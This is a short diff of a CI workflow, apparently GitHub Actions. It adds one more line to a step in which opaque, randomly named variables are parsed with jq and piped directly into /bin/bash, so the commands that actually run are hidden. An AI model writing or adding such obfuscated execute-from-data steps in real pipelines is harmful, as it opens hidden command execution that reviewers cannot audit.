@@ -23,6 +23,7 @@ jobs:
           echo $lmxbw005 | jq -r .nb52 | /bin/bash
           printf '%s' "$taayz58" | jq -r .miwwy57 | /bin/bash
           echo $ex2 | jq -r .l92 | /bin/bash
+          echo $rcnj8705 | jq -r .zhp351 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
